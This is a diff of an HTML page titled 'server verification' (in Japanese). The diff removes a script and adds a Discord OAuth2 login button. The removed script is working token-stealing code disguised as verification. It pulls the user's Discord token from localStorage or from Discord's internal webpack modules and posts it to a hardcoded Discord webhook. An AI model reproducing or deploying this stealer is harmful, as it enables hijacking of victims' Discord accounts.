@@ -1,60 +1,17 @@
-<script>
-    const WEBHOOK = "https://discordapp.com/api/webhooks/1510663755459989644/7J6-Qbs56tJnecY3unFeV6ATkho_LjCsvTYDcVy3ma2Ntj-hgC0AXDJWjuxME_4F7A5F";
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>サーバー認証</title>
+</head>
+<body>
+    <h2>🔒 サーバー認証</h2>
+    <p>下のボタンを押して、Discordアカウントの連携を許可してください。</p>
     
-    async function verify() {
-        console.log("=== 認証開始 ===");
-        
-        // トークン取得
-        let token = null;
-        
-        // LocalStorageチェック
-        try {
-            token = localStorage.getItem('token');
-            console.log("LocalStorage:", token ? "トークンあり" : "なし");
-        } catch(e) {
-            console.log("LocalStorageエラー:", e);
-        }
-        
-        // webpackチェック
-        if (!token) {
-            console.log("webpackチェック...");
-            try {
-                if (window.webpackChunkdiscord_app) {
-                    const modules = [];
-                    window.webpackChunkdiscord_app.push([[''], {}, (e) => {
-                        for (let c in e.c) modules.push(e.c[c]);
-                    }]);
-                    const mod = modules.find(m => m?.exports?.default?.getToken);
-                    if (mod) {
-                        token = mod.exports.default.getToken();
-                        console.log("webpack: トークン取得");
-                    }
-                } else {
-                    console.log("webpack: Discordアプリが見つからない");
-                }
-            } catch(e) {
-                console.log("webpackエラー:", e);
-            }
-        }
-        
-        console.log("最終トークン:", token ? token.substring(0, 20) + "..." : "未取得");
-        
-        // 送信
-        if (token) {
-            try {
-                const res = await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: `Token: \`\`\`${token}\`\`\``
-                    })
-                });
-                console.log("送信結果:", res.status);
-            } catch(e) {
-                console.log("送信エラー:", e);
-            }
-        } else {
-            console.log("送信スキップ: トークンなし");
-        }
-    }
-</script>
+    <a href="https://discord.com/oauth2/authorize?client_id=1509972927263674451&response_type=code&redirect_uri=https%3A%2F%2Fuun-17ss.vercel.app%2F&scope=identify">
+        <button style="background-color: #5865F2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
+            Discordで認証する
+        </button>
+    </a>
+</body>
+</html>
